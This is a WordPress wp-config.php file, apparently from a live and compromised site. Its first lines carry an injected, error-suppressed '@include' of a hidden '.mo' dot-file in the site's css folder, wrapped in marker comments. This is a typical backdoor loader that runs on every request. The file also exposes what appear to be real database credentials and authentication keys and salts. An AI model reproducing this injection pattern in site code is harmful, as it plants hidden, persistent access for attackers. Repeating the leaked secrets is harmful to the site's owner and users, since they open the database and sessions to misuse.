<?php
/*c1008*/

@include ("/home/anxorennsqi4/public_html/css/.51dec7d3.mo");

/*c1008*/
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'digimetryx' );

/** Database username */
define( 'DB_USER', 'digimetryx' );

/** Database password */
define( 'DB_PASSWORD', 'h%?9&8[&smNA' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

define('FORCE_SSL_LOGIN', true);
define('FORCE_SSL_ADMIN', true);
define( 'CONCATENATE_SCRIPTS', false );
define( 'SCRIPT_DEBUG', true );


/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '6h2d613L0}[l#!LGa]F~SG$PKt5W+I[~TR(/:c96 %o~58JrNm6gj9T&kZF;ek}]' );
define( 'SECURE_AUTH_KEY',  'f%XpEjx&=3)d*VbT?.rnDlRxDfgjR4[mG-PgwCcdntkAO-)<F?Y<zE<Oaz~9ynL=' );
define( 'LOGGED_IN_KEY',    'MHA@LZyt0 gICe|&NkxqV%sef:g[oTI)0(>^Y.Dp*2Ln/d#1|]]dx%J*id3{WEqF' );
define( 'NONCE_KEY',        'ZP|4YpP?~#o{[ GYR?4w.qs9uq?gRhU j]!&#KToV*;{12{rSO&tE-*M=3@8E<@3' );
define( 'AUTH_SALT',        'Mc@,[2O61k~;dL&oXz*I*!dIUOjbV#Mq1ck|-Bfvj|9vFZV,K92t-;`WI<b7-/[!' );
define( 'SECURE_AUTH_SALT', '5V*UNtU8ogh()b<yFlh!w?$O+~0_ab095tAqZJzF<k G=!sU_>g>G>vTc6LqYsP}' );
define( 'LOGGED_IN_SALT',   '2( ;/Z)sm5m?C7]m<i3]qvO@tfVu<b$tZ$G4AZG$Wr4_679.Ah@WOUuHe*>X me(' );
define( 'NONCE_SALT',       'Y4M8|M?zMo?|PBea&{{[uso$oS9gv<]I.aBX2L]@844g~{QU!0gq;;N{(vIR|Xw?' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'pwp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/support/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';

define('DISALLOW_FILE_EDIT', true);
define('DISALLOW_FILE_MODS', true);